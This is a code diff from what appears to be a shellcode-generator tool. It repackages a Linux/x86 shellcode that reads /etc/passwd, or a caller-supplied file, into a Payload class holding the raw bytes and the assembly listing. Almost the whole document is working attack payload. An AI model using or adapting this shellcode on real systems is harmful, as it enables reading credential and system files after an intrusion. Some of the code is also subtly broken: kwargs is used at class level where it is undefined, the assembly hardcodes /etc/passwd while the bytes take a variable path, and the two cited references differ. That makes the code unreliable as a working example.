@@ -1,44 +1,50 @@
-#https://www.exploit-db.com/exploits/37359/
+from lib.payloads.shellcode import Shellcode 
 
-def readx86( filee):
-	shellcode =  r"\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05"
-	shellcode += filee
-	shellcode += r"\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66"
-	shellcode += r"\xba\xff\x0f\x66\x42\xcd\x80\x31"
-	shellcode += r"\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
-	return shellcode
+
+class Payload(Shellcode):
+	Shellcode.info["author"] = "B3mB4m"
+	Shellcode.info["name"] = "Linux/x86 - file reader"
+	Shellcode.info["references"] = [
+		"https://www.exploit-db.com/exploits/37297/"
+	]
+	Shellcode.info["size"] = 43 + Shellcode.getsize(kwargs["file"])
+	Shellcode.info["rawassembly"] = [
+		"xor    %ecx,%ecx",
+		"xor    %eax,%eax",
+		"xor    %edx,%edx",
+ 		"push   %ecx",
+		"mov    $0x5,%al",
+		"push   $0x64777373",
+		"push   $0x61702f63",
+		"push   $0x74652f2f",
+ 		"mov    %esp,%ebx",
+		"int    $0x80",
+		"mov    %ebx,%ecx",
+		"mov    %eax,%ebx",
+		"mov    $0x3,%al",
+		"mov    $0xfff,%dx",
+		"inc    %dx",
+		"int    $0x80",
+		"xor    %eax,%eax",
+		"xor    %ebx,%ebx",
+		"mov    $0x1,%bl",
+		"mov    $0x4,%al",
+		"int    $0x80",
+		"xor    %eax,%eax",
+		"mov    $0x1,%al",
+		"int    $0x80",
+	]
+
 	
-#WORK
-#4.0.0-kali1-686-pae
+	def __init__(self, **kwargs): 
+		Shellcode.info["payload"] = [
+			r"\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05"	
+			+kwargs["file"]+
+			r"\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0"
+			r"\x03\x66\xba\xff\x0f\x66\x42\xcd\x80"
+			r"\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd"
+			r"\x80\x31\xc0\xb0\x01\xcd\x80"
+		]
+		
 
-"""
-Linux/x86 - /etc/passwd Reader - 58 bytes
-
-08048060 <.text>:
- 8048060:   31 c9                   xor    %ecx,%ecx
- 8048062:   31 c0                   xor    %eax,%eax
- 8048064:   31 d2                   xor    %edx,%edx
- 8048066:   51                      push   %ecx
- 8048067:   b0 05                   mov    $0x5,%al
- 8048069:   68 73 73 77 64          push   $0x64777373
- 804806e:   68 63 2f 70 61          push   $0x61702f63
- 8048073:   68 2f 2f 65 74          push   $0x74652f2f
- 8048078:   89 e3                   mov    %esp,%ebx
- 804807a:   cd 80                   int    $0x80
- 804807c:   89 d9                   mov    %ebx,%ecx
- 804807e:   89 c3                   mov    %eax,%ebx
- 8048080:   b0 03                   mov    $0x3,%al
- 8048082:   66 ba ff 0f             mov    $0xfff,%dx
- 8048086:   66 42                   inc    %dx
- 8048088:   cd 80                   int    $0x80
- 804808a:   31 c0                   xor    %eax,%eax
- 804808c:   31 db                   xor    %ebx,%ebx
- 804808e:   b3 01                   mov    $0x1,%bl
- 8048090:   b0 04                   mov    $0x4,%al
- 8048092:   cd 80                   int    $0x80
- 8048094:   31 c0                   xor    %eax,%eax
- 8048096:   b0 01                   mov    $0x1,%al
- 8048098:   cd 80                   int    $0x80
-
- """
 
